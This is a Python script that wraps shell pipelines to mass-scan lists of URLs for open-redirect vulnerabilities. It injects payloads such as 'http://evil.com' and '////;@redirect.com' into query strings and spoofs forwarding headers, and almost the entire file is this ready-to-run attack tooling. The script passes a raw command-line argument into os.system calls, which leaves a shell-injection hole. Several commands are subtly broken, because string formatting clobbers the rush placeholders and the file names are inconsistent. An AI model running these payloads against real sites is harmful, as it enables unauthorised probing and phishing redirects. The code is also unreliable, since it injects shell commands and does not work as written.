from os import system
import sys

msg = sys.argv[1]

system("cat {}urls.txt | grep -a -i \=http | qsreplace 'http://evil.com' | while read host; do curl -s -L $host -I | grep 'http://evil.com' && echo -e \"$host \033[0;31mVulnerable\n\"; done | tee -a {}redir.txt".format(msg, msg))
system("cat {}urls.txt | gf redirect | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain' | tee -a {}redir.txt".format(msg, msg))
system("cat {}urls.txt | httpx -silent -timeout 2 -threads 100 | gf redirect | anew | tee -a {}redir.txt".format(msg, msg))
system('cat {}urls.txt | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c \'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"\' | tee -a {}redir.txt'.format(msg, msg))
system('cat {}.txt | httpx | rush -j40 \'if curl -Iks -m 10 "{}/https://redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}////;@redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/////redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "{} It seems an Open Redirect Found"; fi\' | tee -a {}redir.txt'.format(msg, msg, msg, msg, msg, msg, msg))
system('cat {}urls.txt | qsreplace "https://redirect.com" | rush -j40 \'if curl -Iks -m 10 "{}" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi\' | tee -a {}redir.txt'.format(msg, msg, msg, msg))
system('cat {}urls.txt | qsreplace "redirect.com" | rush -j40 \'if curl -Iks -m 10 "{}" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi\' | tee -a {}redir.txt'.format(msg, msg, msg, msg))
system('cat {}urls.txt | qsreplace "////;@redirect.com" | rush -j40 \'if curl -Iks -m 10 "{}" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi\' | tee -a {}redir.txt'.format(msg, msg, msg, msg))
system('cat {}urls.txt | qsreplace "/////redirect.com" | rush -j40 \'if curl -Iks -m 10 "{}" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "Open Redirect found on {}"; fi\' | tee -a {}redir.txt'.format(msg, msg, msg, msg))
system('cat {}.txt | httpx | rush -j40 \'if curl -Iks -m 10 "$line" -H "CF-Connecting_IP: https://redirect.com" -H "From: root@https://redirect.com" -H "Client-IP: https://redirect.com" -H "X-Client-IP: https://redirect.com" -H "X-Forwarded-For: https://redirect.com" -H "X-Wap-Profile: https://redirect.com" -H "Forwarded: https://redirect.com" -H "True-Client-IP: https://redirect.com" -H "Contact: root@https://redirect.com" -H "X-Originating-IP: https://redirect.com" -H "X-Real-IP: https://redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "$line" -H "CF-Connecting_IP: redirect.com" -H "From: root@redirect.com" -H "Client-IP: redirect.com" -H "X-Client-IP: redirect.com" -H "X-Forwarded-For: redirect.com" -H "X-Wap-Profile: redirect.com" -H "Forwarded: redirect.com" -H "True-Client-IP: redirect.com" -H "Contact: root@redirect.com" -H "X-Originating-IP: redirect.com" -H "X-Real-IP: redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "The URL $line with vulnerable header may be vulnerable to Open Redirection. Check Manually";fi\' | tee -a {}redir.txt'.format(msg, msg))

system("sort {}redir.txt | uniq > {}redir_sorted.txt".format(msg, msg))
system("rm -rf {}redir.txt".format(msg))
system("mv {}redir_sorted.txt {}redir.txt".format(msg, msg))
system("rm -rf {}redir_sorted.txt".format(msg))

print(f"Open-Redirect vulnerabilities saved to: {msg}redir.txt")

# system(f"cat tee -a {msg}redir.txt | notify")
